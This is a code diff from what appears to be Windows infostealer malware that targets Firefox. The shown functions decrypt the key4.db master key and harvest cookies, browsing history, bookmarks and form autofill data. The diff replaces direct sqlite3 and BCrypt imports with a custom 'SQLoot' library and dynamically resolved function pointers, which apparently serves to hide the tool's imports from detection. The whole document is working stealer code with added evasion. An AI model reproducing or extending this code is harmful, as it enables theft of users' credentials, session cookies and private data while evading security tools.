@@ -1,12 +1,10 @@
 #include "Headers.h"
-#include "sqlite3.h"
+#include "SQLoot.h"
 
 // ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
+// Extern Global (Defined in 'Main.cpp')
 
-#define BUFFER_SIZE_08                  8
-#define BUFFER_SIZE_14                  14
-#define BUFFER_SIZE_20                  20
-#define BUFFER_SIZE_24                  24
+extern DINMCLY_RSOLVD_FUNCTIONS g_ResolvedFunctions;
 
 // ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
 
@@ -242,13 +240,13 @@ static BOOL DeriveKeyPbkdf2(IN PBYTE pbPassword, IN DWORD cbPassword, IN PBYTE p
     NTSTATUS            ntStatus    = 0x00;
     BOOL                bResult     = FALSE;
 
-    if ((ntStatus = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_SHA256_ALGORITHM, NULL, BCRYPT_ALG_HANDLE_HMAC_FLAG)) != 0)
+    if ((ntStatus = g_ResolvedFunctions.pBCryptOpenAlgorithmProvider(&hAlg, BCRYPT_SHA256_ALGORITHM, NULL, BCRYPT_ALG_HANDLE_HMAC_FLAG)) != 0)
     {
         DBGA("[!] BCryptOpenAlgorithmProvider Failed With Error: 0x%08X", ntStatus);
         goto _END_OF_FUNC;
     }
 
-    if ((ntStatus = BCryptDeriveKeyPBKDF2(hAlg, pbPassword, cbPassword, pbSalt, cbSalt, dwIterations, pbDerivedKey, cbDerivedKey, 0)) != 0)
+    if ((ntStatus = g_ResolvedFunctions.pBCryptDeriveKeyPBKDF2(hAlg, pbPassword, cbPassword, pbSalt, cbSalt, dwIterations, pbDerivedKey, cbDerivedKey, 0)) != 0)
     {
         DBGA("[!] BCryptDeriveKeyPBKDF2 Failed With Error: 0x%08X", ntStatus);
         goto _END_OF_FUNC;
@@ -257,7 +255,7 @@ static BOOL DeriveKeyPbkdf2(IN PBYTE pbPassword, IN DWORD cbPassword, IN PBYTE p
     bResult = TRUE;
 
 _END_OF_FUNC:
-    if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
+    if (hAlg) g_ResolvedFunctions.pBCryptCloseAlgorithmProvider(hAlg, 0);
     return bResult;
 }
 
@@ -275,19 +273,19 @@ static BOOL DecryptAesCbc(IN PBYTE pbKey, IN DWORD dwKey, IN PBYTE pbIv, IN PBYT
     if (!pbKey || !pbIv || !pbCiphertext || !ppbPlaintext || !pdwPlaintext)
         return FALSE;
 
-    if ((ntStatus = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0)) != 0)
+    if ((ntStatus = g_ResolvedFunctions.pBCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0)) != 0)
     {
         DBGA("[!] BCryptOpenAlgorithmProvider Failed With Error: 0x%08X", ntStatus);
         return FALSE;
     }
 
-    if ((ntStatus = BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0)) != 0)
+    if ((ntStatus = g_ResolvedFunctions.pBCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0)) != 0)
     {
         DBGA("[!] BCryptSetProperty Failed With Error: 0x%08X", ntStatus);
         goto _END_OF_FUNC;
     }
 
-    if ((ntStatus = BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, pbKey, dwKey, 0)) != 0)
+    if ((ntStatus = g_ResolvedFunctions.pBCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, pbKey, dwKey, 0)) != 0)
     {
         DBGA("[!] BCryptGenerateSymmetricKey Failed With Error: 0x%08X", ntStatus);
         goto _END_OF_FUNC;
@@ -295,7 +293,7 @@ static BOOL DecryptAesCbc(IN PBYTE pbKey, IN DWORD dwKey, IN PBYTE pbIv, IN PBYT
 
     RtlCopyMemory(pIvCopy, pbIv, BUFFER_SIZE_16);
 
-    if ((ntStatus = BCryptDecrypt(hKey, pbCiphertext, dwCiphertext, NULL, pIvCopy, BUFFER_SIZE_16, NULL, 0, &dwPlaintext, BCRYPT_BLOCK_PADDING)) != 0)
+    if ((ntStatus = g_ResolvedFunctions.pBCryptDecrypt(hKey, pbCiphertext, dwCiphertext, NULL, pIvCopy, BUFFER_SIZE_16, NULL, 0, &dwPlaintext, BCRYPT_BLOCK_PADDING)) != 0)
     {
         DBGA("[!] BCryptDecrypt [%d] Failed With Error: 0x%08X", __LINE__, ntStatus);
         goto _END_OF_FUNC;
@@ -309,7 +307,7 @@ static BOOL DecryptAesCbc(IN PBYTE pbKey, IN DWORD dwKey, IN PBYTE pbIv, IN PBYT
 
     RtlCopyMemory(pIvCopy, pbIv, BUFFER_SIZE_16);
 
-    if ((ntStatus = BCryptDecrypt(hKey, pbCiphertext, dwCiphertext, NULL, pIvCopy, BUFFER_SIZE_16, pbPlaintext, dwPlaintext, &dwResult, BCRYPT_BLOCK_PADDING)) != 0)
+    if ((ntStatus = g_ResolvedFunctions.pBCryptDecrypt(hKey, pbCiphertext, dwCiphertext, NULL, pIvCopy, BUFFER_SIZE_16, pbPlaintext, dwPlaintext, &dwResult, BCRYPT_BLOCK_PADDING)) != 0)
     {
         DBGA("[!] BCryptDecrypt [%d] Failed With Error: 0x%08X", __LINE__, ntStatus);
         goto _END_OF_FUNC;
@@ -323,9 +321,9 @@ static BOOL DecryptAesCbc(IN PBYTE pbKey, IN DWORD dwKey, IN PBYTE pbIv, IN PBYT
 _END_OF_FUNC:
     HEAP_FREE(pbPlaintext);
     if (hKey) 
-        BCryptDestroyKey(hKey);
+        g_ResolvedFunctions.pBCryptDestroyKey(hKey);
     if (hAlg) 
-        BCryptCloseAlgorithmProvider(hAlg, 0);
+        g_ResolvedFunctions.pBCryptCloseAlgorithmProvider(hAlg, 0);
     return bResult;
 }
 
@@ -343,19 +341,19 @@ static BOOL Decrypt3DesCbc(IN PBYTE pbKey, IN DWORD dwKey, IN PBYTE pbIv, IN PBY
     if (!pbKey || !pbIv || !pbCiphertext || !ppbPlaintext || !pdwPlaintext)
         return FALSE;
 
-    if ((ntStatus = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_3DES_ALGORITHM, NULL, 0)) != 0)
+    if ((ntStatus = g_ResolvedFunctions.pBCryptOpenAlgorithmProvider(&hAlg, BCRYPT_3DES_ALGORITHM, NULL, 0)) != 0)
     {
         DBGA("[!] BCryptOpenAlgorithmProvider Failed With Error: 0x%08X", ntStatus);
         goto _END_OF_FUNC;
     }
 
-    if ((ntStatus = BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0)) != 0)
+    if ((ntStatus = g_ResolvedFunctions.pBCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0)) != 0)
     {
         DBGA("[!] BCryptSetProperty Failed With Error: 0x%08X", ntStatus);
         goto _END_OF_FUNC;
     }
 
-    if ((ntStatus = BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, pbKey, dwKey, 0)) != 0)
+    if ((ntStatus = g_ResolvedFunctions.pBCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, pbKey, dwKey, 0)) != 0)
     {
         DBGA("[!] BCryptGenerateSymmetricKey Failed With Error: 0x%08X", ntStatus);
         goto _END_OF_FUNC;
@@ -363,7 +361,7 @@ static BOOL Decrypt3DesCbc(IN PBYTE pbKey, IN DWORD dwKey, IN PBYTE pbIv, IN PBY
 
     RtlCopyMemory(pIvCopy, pbIv, BUFFER_SIZE_08);
 
-    if ((ntStatus = BCryptDecrypt(hKey, pbCiphertext, dwCiphertext, NULL, pIvCopy, BUFFER_SIZE_08, NULL, 0, &dwPlaintext, BCRYPT_BLOCK_PADDING)) != 0)
+    if ((ntStatus = g_ResolvedFunctions.pBCryptDecrypt(hKey, pbCiphertext, dwCiphertext, NULL, pIvCopy, BUFFER_SIZE_08, NULL, 0, &dwPlaintext, BCRYPT_BLOCK_PADDING)) != 0)
     {
         DBGA("[!] BCryptDecrypt [%d] Failed With Error: 0x%08X", __LINE__, ntStatus);
         goto _END_OF_FUNC;
@@ -377,7 +375,7 @@ static BOOL Decrypt3DesCbc(IN PBYTE pbKey, IN DWORD dwKey, IN PBYTE pbIv, IN PBY
 
     RtlCopyMemory(pIvCopy, pbIv, BUFFER_SIZE_08);
 
-    if ((ntStatus = BCryptDecrypt(hKey, pbCiphertext, dwCiphertext, NULL, pIvCopy, BUFFER_SIZE_08, pbPlaintext, dwPlaintext, &dwResult, BCRYPT_BLOCK_PADDING)) != 0)
+    if ((ntStatus = g_ResolvedFunctions.pBCryptDecrypt(hKey, pbCiphertext, dwCiphertext, NULL, pIvCopy, BUFFER_SIZE_08, pbPlaintext, dwPlaintext, &dwResult, BCRYPT_BLOCK_PADDING)) != 0)
     {
         DBGA("[!] BCryptDecrypt [%d] Failed With Error: 0x%08X", __LINE__, ntStatus);
         goto _END_OF_FUNC;
@@ -391,9 +389,9 @@ static BOOL Decrypt3DesCbc(IN PBYTE pbKey, IN DWORD dwKey, IN PBYTE pbIv, IN PBY
 _END_OF_FUNC:
     HEAP_FREE(pbPlaintext);
     if (hKey) 
-        BCryptDestroyKey(hKey);
+        g_ResolvedFunctions.pBCryptDestroyKey(hKey);
     if (hAlg) 
-        BCryptCloseAlgorithmProvider(hAlg, 0);
+        g_ResolvedFunctions.pBCryptCloseAlgorithmProvider(hAlg, 0);
     return bResult;
 }
 
@@ -407,19 +405,19 @@ static BOOL ComputeSha1Hash(IN PBYTE pbData1, IN DWORD dwData1, IN OPTIONAL PBYT
     if (!pbData1 || !dwData1 || !pbHash || dwHash < BUFFER_SIZE_20)
         return FALSE;
 
-    if ((ntStatus = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_SHA1_ALGORITHM, NULL, 0)) != 0)
+    if ((ntStatus = g_ResolvedFunctions.pBCryptOpenAlgorithmProvider(&hAlg, BCRYPT_SHA1_ALGORITHM, NULL, 0)) != 0)
     {
         DBGA("[!] BCryptOpenAlgorithmProvider Failed With Error: 0x%08X", ntStatus);
         return FALSE;
     }
 
-    if ((ntStatus = BCryptCreateHash(hAlg, &hHash, NULL, 0, NULL, 0, 0)) != 0)
+    if ((ntStatus = g_ResolvedFunctions.pBCryptCreateHash(hAlg, &hHash, NULL, 0, NULL, 0, 0)) != 0)
     {
         DBGA("[!] BCryptCreateHash Failed With Error: 0x%08X", ntStatus);
         goto _END_OF_FUNC;
     }
 
-    if ((ntStatus = BCryptHashData(hHash, pbData1, dwData1, 0)) != 0)
+    if ((ntStatus = g_ResolvedFunctions.pBCryptHashData(hHash, pbData1, dwData1, 0)) != 0)
     {
         DBGA("[!] BCryptHashData [%d] Failed With Error: 0x%08X", __LINE__, ntStatus);
         goto _END_OF_FUNC;
@@ -427,14 +425,14 @@ static BOOL ComputeSha1Hash(IN PBYTE pbData1, IN DWORD dwData1, IN OPTIONAL PBYT
 
     if (pbData2 && dwData2 > 0)
     {
-        if ((ntStatus = BCryptHashData(hHash, pbData2, dwData2, 0)) != 0)
+        if ((ntStatus = g_ResolvedFunctions.pBCryptHashData(hHash, pbData2, dwData2, 0)) != 0)
         {
             DBGA("[!] BCryptHashData [%d] Failed With Error: 0x%08X", __LINE__, ntStatus);
             goto _END_OF_FUNC;
         }
     }
 
-    if ((ntStatus = BCryptFinishHash(hHash, pbHash, dwHash, 0)) != 0)
+    if ((ntStatus = g_ResolvedFunctions.pBCryptFinishHash(hHash, pbHash, dwHash, 0)) != 0)
     {
         DBGA("[!] BCryptFinishHash Failed With Error: 0x%08X", ntStatus);
         goto _END_OF_FUNC;
@@ -444,9 +442,9 @@ static BOOL ComputeSha1Hash(IN PBYTE pbData1, IN DWORD dwData1, IN OPTIONAL PBYT
 
 _END_OF_FUNC:
     if (hHash) 
-        BCryptDestroyHash(hHash);
+        g_ResolvedFunctions.pBCryptDestroyHash(hHash);
     if (hAlg) 
-        BCryptCloseAlgorithmProvider(hAlg, 0);
+        g_ResolvedFunctions.pBCryptCloseAlgorithmProvider(hAlg, 0);
     return bResult;
 }
 
@@ -778,9 +776,9 @@ _END_OF_FUNC:
 
 BOOL ExtractMasterKeyFromKey4Db(IN OPTIONAL LPCSTR pszMasterPassword, OUT PBYTE* ppbMasterKey, OUT PDWORD pdwMasterKey)
 {
-    sqlite3*        pDb                             = NULL;
-    sqlite3_stmt*   pStmt                           = NULL;
-    INT             nResult                         = SQLITE_OK;
+    PSQLOOT_DB      pDb                             = NULL;
+    PSQLOOT_STMT    pStmt                           = NULL;
+    INT             nResult                         = SQLOOT_RESULT_OK;
     LPSTR           pszKey4DbPath                   = NULL;
     PBYTE           pbGlobalSalt                    = NULL,
                     pbEncrypted                     = NULL,
@@ -800,26 +798,26 @@ BOOL ExtractMasterKeyFromKey4Db(IN OPTIONAL LPCSTR pszMasterPassword, OUT PBYTE*
     if (!(pszKey4DbPath = GetFirefoxFilePath(STR_FF_KEY4_DB)))
         return FALSE;
 
-    if ((nResult = sqlite3_open_v2(pszKey4DbPath, &pDb, SQLITE_OPEN_READONLY, NULL)) != SQLITE_OK)
+    if ((nResult = SQLootOpen(pszKey4DbPath, &pDb, SQLOOT_OPEN_READONLY)) != SQLOOT_RESULT_OK)
     {
-        DBGA("[!] sqlite3_open_v2 Failed With Error: %d (%s)", nResult, sqlite3_errmsg(pDb));
+        DBGA("[!] SQLootOpen Failed With Error: %d (%s)", nResult, SQLootErrmsg(pDb));
         goto _END_OF_FUNC;
     }
 
     // Get global salt from metadata table
-    if ((nResult = sqlite3_prepare_v2(pDb, SQLQUERY_FF_METADATA, -1, &pStmt, NULL)) != SQLITE_OK)
+    if ((nResult = SQLootPrepare(pDb, SQLQUERY_FF_METADATA, -1, &pStmt)) != SQLOOT_RESULT_OK)
     {
-        DBGA("[!] sqlite3_prepare_v2 Failed With Error: %d (%s)", nResult, sqlite3_errmsg(pDb));
+        DBGA("[!] SQLootPrepare Failed With Error: %d (%s)", nResult, SQLootErrmsg(pDb));
         goto _END_OF_FUNC;
     }
 
-    if ((nResult = sqlite3_step(pStmt)) == SQLITE_ROW)
+    if ((nResult = SQLootStep(pStmt)) == SQLOOT_RESULT_ROW)
     {
-        dwGlobalSalt    = sqlite3_column_bytes(pStmt, 0);
-        pbGlobalSalt    = DuplicateBuffer((PBYTE)sqlite3_column_blob(pStmt, 0), dwGlobalSalt);
+        dwGlobalSalt    = SQLootColumnBytes(pStmt, 0);
+        pbGlobalSalt    = DuplicateBuffer((PBYTE)SQLootColumnBlob(pStmt, 0), dwGlobalSalt);
     }
 
-    sqlite3_finalize(pStmt);
+    SQLootFinalize(pStmt);
     pStmt = NULL;
 
     if (!pbGlobalSalt)
@@ -840,22 +838,22 @@ BOOL ExtractMasterKeyFromKey4Db(IN OPTIONAL LPCSTR pszMasterPassword, OUT PBYTE*
     }
 
     // Get encrypted key from nssPrivate table
-    if ((nResult = sqlite3_prepare_v2(pDb, SQLQUERY_FF_PRIVATE, -1, &pStmt, NULL)) != SQLITE_OK)
+    if ((nResult = SQLootPrepare(pDb, SQLQUERY_FF_PRIVATE, -1, &pStmt)) != SQLOOT_RESULT_OK)
     {
-        DBGA("[!] sqlite3_prepare_v2 Failed With Error: %d (%s)", nResult, sqlite3_errmsg(pDb));
+        DBGA("[!] SQLootPrepare Failed With Error: %d (%s)", nResult, SQLootErrmsg(pDb));
         goto _END_OF_FUNC;
     }
 
     // Try each row until we find one that works
-    while ((nResult = sqlite3_step(pStmt)) == SQLITE_ROW)
+    while ((nResult = SQLootStep(pStmt)) == SQLOOT_RESULT_ROW)
     {
         HEAP_FREE(pbEncrypted);
         HEAP_FREE_SECURE(pbDecrypted, dwDecrypted);
         pbDecrypted = NULL;
         dwDecrypted = 0;
 
-        dwEncrypted = sqlite3_column_bytes(pStmt, 0);
-        pbEncrypted = DuplicateBuffer((PBYTE)sqlite3_column_blob(pStmt, 0), dwEncrypted);
+        dwEncrypted = SQLootColumnBytes(pStmt, 0);
+        pbEncrypted = DuplicateBuffer((PBYTE)SQLootColumnBlob(pStmt, 0), dwEncrypted);
 
         if (!pbEncrypted)
             continue;
@@ -876,8 +874,8 @@ BOOL ExtractMasterKeyFromKey4Db(IN OPTIONAL LPCSTR pszMasterPassword, OUT PBYTE*
     }
 
 _END_OF_FUNC:
-    if (pStmt) sqlite3_finalize(pStmt);
-    if (pDb) sqlite3_close(pDb);
+    if (pStmt) SQLootFinalize(pStmt);
+    if (pDb) SQLootClose(pDb);
     HEAP_FREE(pszKey4DbPath);
     HEAP_FREE(pbGlobalSalt);
     HEAP_FREE(pbEncrypted);
@@ -891,9 +889,9 @@ _END_OF_FUNC:
 
 BOOL ExtractFirefoxCookies(IN OUT PCHROMIUM_DATA pChromiumData)
 {
-    sqlite3*        pDb         = NULL;
-    sqlite3_stmt*   pStmt       = NULL;
-    INT             nResult     = SQLITE_OK;
+    PSQLOOT_DB      pDb         = NULL;
+    PSQLOOT_STMT    pStmt       = NULL;
+    INT             nResult     = SQLOOT_RESULT_OK;
     LPSTR           pszDbPath   = NULL;
     BOOL            bResult     = FALSE;
 
@@ -903,25 +901,25 @@ BOOL ExtractFirefoxCookies(IN OUT PCHROMIUM_DATA pChromiumData)
     if (!(pszDbPath = GetFirefoxFilePath(STR_FF_COOKIES_DB)))
         return FALSE;
 
-    if ((nResult = sqlite3_open_v2(pszDbPath, &pDb, SQLITE_OPEN_READONLY, NULL)) != SQLITE_OK)
+    if ((nResult = SQLootOpen(pszDbPath, &pDb, SQLOOT_OPEN_READONLY)) != SQLOOT_RESULT_OK)
     {
-        DBGA("[!] sqlite3_open_v2 Failed With Error: %d (%s)", nResult, sqlite3_errmsg(pDb));
+        DBGA("[!] SQLootOpen Failed With Error: %d (%s)", nResult, SQLootErrmsg(pDb));
         goto _END_OF_FUNC;
     }
 
-    if ((nResult = sqlite3_prepare_v2(pDb, SQLQUERY_FF_COOKIES, -1, &pStmt, NULL)) != SQLITE_OK)
+    if ((nResult = SQLootPrepare(pDb, SQLQUERY_FF_COOKIES, -1, &pStmt)) != SQLOOT_RESULT_OK)
     {
-        DBGA("[!] sqlite3_prepare_v2 Failed With Error: %d (%s)", nResult, sqlite3_errmsg(pDb));
+        DBGA("[!] SQLootPrepare Failed With Error: %d (%s)", nResult, SQLootErrmsg(pDb));
         goto _END_OF_FUNC;
     }
 
-    while ((nResult = sqlite3_step(pStmt)) == SQLITE_ROW)
+    while ((nResult = SQLootStep(pStmt)) == SQLOOT_RESULT_ROW)
     {
-        LPCSTR  szHost      = (LPCSTR)sqlite3_column_text(pStmt, 0);
-        LPCSTR  szPath      = (LPCSTR)sqlite3_column_text(pStmt, 1);
-        LPCSTR  szName      = (LPCSTR)sqlite3_column_text(pStmt, 2);
-        LPCSTR  szValue     = (LPCSTR)sqlite3_column_text(pStmt, 3);
-        INT64   llExpiry    = sqlite3_column_int64(pStmt, 4);
+        LPCSTR  szHost      = SQLootColumnText(pStmt, 0);
+        LPCSTR  szPath      = SQLootColumnText(pStmt, 1);
+        LPCSTR  szName      = SQLootColumnText(pStmt, 2);
+        LPCSTR  szValue     = SQLootColumnText(pStmt, 3);
+        INT64   llExpiry    = SQLootColumnInt64(pStmt, 4);
 
         AddCookieEntry(pChromiumData, szHost, szPath, szName, llExpiry, (PBYTE)szValue, szValue ? lstrlenA(szValue) : 0);
     }
@@ -929,17 +927,17 @@ BOOL ExtractFirefoxCookies(IN OUT PCHROMIUM_DATA pChromiumData)
     bResult = TRUE;
 
 _END_OF_FUNC:
-    if (pStmt) sqlite3_finalize(pStmt);
-    if (pDb) sqlite3_close(pDb);
+    if (pStmt) SQLootFinalize(pStmt);
+    if (pDb) SQLootClose(pDb);
     HEAP_FREE(pszDbPath);
     return bResult;
 }
 
 BOOL ExtractFirefoxHistory(IN OUT PCHROMIUM_DATA pChromiumData)
 {
-    sqlite3*        pDb         = NULL;
-    sqlite3_stmt*   pStmt       = NULL;
-    INT             nResult     = SQLITE_OK;
+    PSQLOOT_DB      pDb         = NULL;
+    PSQLOOT_STMT    pStmt       = NULL;
+    INT             nResult     = SQLOOT_RESULT_OK;
     LPSTR           pszDbPath   = NULL;
     BOOL            bResult     = FALSE;
 
@@ -949,24 +947,24 @@ BOOL ExtractFirefoxHistory(IN OUT PCHROMIUM_DATA pChromiumData)
     if (!(pszDbPath = GetFirefoxFilePath(STR_FF_PLACES_DB)))
         return FALSE;
 
-    if ((nResult = sqlite3_open_v2(pszDbPath, &pDb, SQLITE_OPEN_READONLY, NULL)) != SQLITE_OK)
+    if ((nResult = SQLootOpen(pszDbPath, &pDb, SQLOOT_OPEN_READONLY)) != SQLOOT_RESULT_OK)
     {
-        DBGA("[!] sqlite3_open_v2 Failed With Error: %d (%s)", nResult, sqlite3_errmsg(pDb));
+        DBGA("[!] SQLootOpen Failed With Error: %d (%s)", nResult, SQLootErrmsg(pDb));
         goto _END_OF_FUNC;
     }
 
-    if ((nResult = sqlite3_prepare_v2(pDb, SQLQUERY_FF_HISTORY, -1, &pStmt, NULL)) != SQLITE_OK)
+    if ((nResult = SQLootPrepare(pDb, SQLQUERY_FF_HISTORY, -1, &pStmt)) != SQLOOT_RESULT_OK)
     {
-        DBGA("[!] sqlite3_prepare_v2 Failed With Error: %d (%s)", nResult, sqlite3_errmsg(pDb));
+        DBGA("[!] SQLootPrepare Failed With Error: %d (%s)", nResult, SQLootErrmsg(pDb));
         goto _END_OF_FUNC;
     }
 
-    while ((nResult = sqlite3_step(pStmt)) == SQLITE_ROW)
+    while ((nResult = SQLootStep(pStmt)) == SQLOOT_RESULT_ROW)
     {
-        LPCSTR  szUrl           = (LPCSTR)sqlite3_column_text(pStmt, 0);
-        LPCSTR  szTitle         = (LPCSTR)sqlite3_column_text(pStmt, 1);
-        DWORD   dwVisitCount    = sqlite3_column_int(pStmt, 2);
-        INT64   llLastVisit     = sqlite3_column_int64(pStmt, 3);
+        LPCSTR  szUrl           = SQLootColumnText(pStmt, 0);
+        LPCSTR  szTitle         = SQLootColumnText(pStmt, 1);
+        DWORD   dwVisitCount    = SQLootColumnInt(pStmt, 2);
+        INT64   llLastVisit     = SQLootColumnInt64(pStmt, 3);
 
         AddHistoryEntry(pChromiumData, szUrl, szTitle, dwVisitCount, llLastVisit / 1000000);
     }
@@ -974,17 +972,17 @@ BOOL ExtractFirefoxHistory(IN OUT PCHROMIUM_DATA pChromiumData)
     bResult = TRUE;
 
 _END_OF_FUNC:
-    if (pStmt) sqlite3_finalize(pStmt);
-    if (pDb) sqlite3_close(pDb);
+    if (pStmt) SQLootFinalize(pStmt);
+    if (pDb) SQLootClose(pDb);
     HEAP_FREE(pszDbPath);
     return bResult;
 }
 
 BOOL ExtractFirefoxBookmarks(IN OUT PCHROMIUM_DATA pChromiumData)
 {
-    sqlite3*        pDb         = NULL;
-    sqlite3_stmt*   pStmt       = NULL;
-    INT             nResult     = SQLITE_OK;
+    PSQLOOT_DB      pDb         = NULL;
+    PSQLOOT_STMT    pStmt       = NULL;
+    INT             nResult     = SQLOOT_RESULT_OK;
     LPSTR           pszDbPath   = NULL;
     BOOL            bResult     = FALSE;
 
@@ -994,41 +992,42 @@ BOOL ExtractFirefoxBookmarks(IN OUT PCHROMIUM_DATA pChromiumData)
     if (!(pszDbPath = GetFirefoxFilePath(STR_FF_PLACES_DB)))
         return FALSE;
 
-    if ((nResult = sqlite3_open_v2(pszDbPath, &pDb, SQLITE_OPEN_READONLY, NULL)) != SQLITE_OK)
+    if ((nResult = SQLootOpen(pszDbPath, &pDb, SQLOOT_OPEN_READONLY)) != SQLOOT_RESULT_OK)
     {
-        DBGA("[!] sqlite3_open_v2 Failed With Error: %d (%s)", nResult, sqlite3_errmsg(pDb));
+        DBGA("[!] SQLootOpen Failed With Error: %d (%s)", nResult, SQLootErrmsg(pDb));
         goto _END_OF_FUNC;
     }
 
-    if ((nResult = sqlite3_prepare_v2(pDb, SQLQUERY_FF_BOOKMARKS, -1, &pStmt, NULL)) != SQLITE_OK)
+    if ((nResult = SQLootPrepare(pDb, SQLQUERY_FF_BOOKMARKS, -1, &pStmt)) != SQLOOT_RESULT_OK)
     {
-        DBGA("[!] sqlite3_prepare_v2 Failed With Error: %d (%s)", nResult, sqlite3_errmsg(pDb));
+        DBGA("[!] SQLootPrepare Failed With Error: %d (%s)", nResult, SQLootErrmsg(pDb));
         goto _END_OF_FUNC;
     }
 
-    while ((nResult = sqlite3_step(pStmt)) == SQLITE_ROW)
+    while ((nResult = SQLootStep(pStmt)) == SQLOOT_RESULT_ROW)
     {
-        LPCSTR  szTitle     = (LPCSTR)sqlite3_column_text(pStmt, 0);
-        LPCSTR  szUrl       = (LPCSTR)sqlite3_column_text(pStmt, 1);
-        INT64   llDateAdded = sqlite3_column_int64(pStmt, 2);
+        LPCSTR  szTitle     = SQLootColumnText(pStmt, 0);
+        LPCSTR  szUrl       = SQLootColumnText(pStmt, 1);
+        INT64   llDateAdded = SQLootColumnInt64(pStmt, 2);
 
         AddBookmarkEntry(pChromiumData, szTitle, szUrl, llDateAdded / 1000000);
     }
 
+
     bResult = TRUE;
 
 _END_OF_FUNC:
-    if (pStmt) sqlite3_finalize(pStmt);
-    if (pDb) sqlite3_close(pDb);
+    if (pStmt) SQLootFinalize(pStmt);
+    if (pDb) SQLootClose(pDb);
     HEAP_FREE(pszDbPath);
     return bResult;
 }
 
 BOOL ExtractFirefoxAutofill(IN OUT PCHROMIUM_DATA pChromiumData)
 {
-    sqlite3*        pDb         = NULL;
-    sqlite3_stmt*   pStmt       = NULL;
-    INT             nResult     = SQLITE_OK;
+    PSQLOOT_DB      pDb         = NULL;
+    PSQLOOT_STMT    pStmt       = NULL;
+    INT             nResult     = SQLOOT_RESULT_OK;
     LPSTR           pszDbPath   = NULL;
     BOOL            bResult     = FALSE;
 
@@ -1038,24 +1037,24 @@ BOOL ExtractFirefoxAutofill(IN OUT PCHROMIUM_DATA pChromiumData)
     if (!(pszDbPath = GetFirefoxFilePath(STR_FF_FORMHISTORY_DB)))
         return FALSE;
 
-    if ((nResult = sqlite3_open_v2(pszDbPath, &pDb, SQLITE_OPEN_READONLY, NULL)) != SQLITE_OK)
+    if ((nResult = SQLootOpen(pszDbPath, &pDb, SQLOOT_OPEN_READONLY)) != SQLOOT_RESULT_OK)
     {
-        DBGA("[!] sqlite3_open_v2 Failed With Error: %d (%s)", nResult, sqlite3_errmsg(pDb));
+        DBGA("[!] SQLootOpen Failed With Error: %d (%s)", nResult, SQLootErrmsg(pDb));
         goto _END_OF_FUNC;
     }
 
-    if ((nResult = sqlite3_prepare_v2(pDb, SQLQUERY_FF_FORMHISTORY, -1, &pStmt, NULL)) != SQLITE_OK)
+    if ((nResult = SQLootPrepare(pDb, SQLQUERY_FF_FORMHISTORY, -1, &pStmt)) != SQLOOT_RESULT_OK)
     {
-        DBGA("[!] sqlite3_prepare_v2 Failed With Error: %d (%s)", nResult, sqlite3_errmsg(pDb));
+        DBGA("[!] SQLootPrepare Failed With Error: %d (%s)", nResult, SQLootErrmsg(pDb));
         goto _END_OF_FUNC;
     }
 
-    while ((nResult = sqlite3_step(pStmt)) == SQLITE_ROW)
+    while ((nResult = SQLootStep(pStmt)) == SQLOOT_RESULT_ROW)
     {
-        LPCSTR  szFieldName = (LPCSTR)sqlite3_column_text(pStmt, 0);
-        LPCSTR  szValue     = (LPCSTR)sqlite3_column_text(pStmt, 1);
-        DWORD   dwTimesUsed = sqlite3_column_int(pStmt, 2);
-        INT64   llFirstUsed = sqlite3_column_int64(pStmt, 3);
+        LPCSTR  szFieldName = SQLootColumnText(pStmt, 0);
+        LPCSTR  szValue     = SQLootColumnText(pStmt, 1);
+        DWORD   dwTimesUsed = SQLootColumnInt(pStmt, 2);
+        INT64   llFirstUsed = SQLootColumnInt64(pStmt, 3);
 
         AddAutofillEntry(pChromiumData, szFieldName, szValue, llFirstUsed / 1000000, dwTimesUsed);
     }
@@ -1063,8 +1062,8 @@ BOOL ExtractFirefoxAutofill(IN OUT PCHROMIUM_DATA pChromiumData)
     bResult = TRUE;
 
 _END_OF_FUNC:
-    if (pStmt) sqlite3_finalize(pStmt);
-    if (pDb) sqlite3_close(pDb);
+    if (pStmt) SQLootFinalize(pStmt);
+    if (pDb) SQLootClose(pDb);
     HEAP_FREE(pszDbPath);
     return bResult;
 }
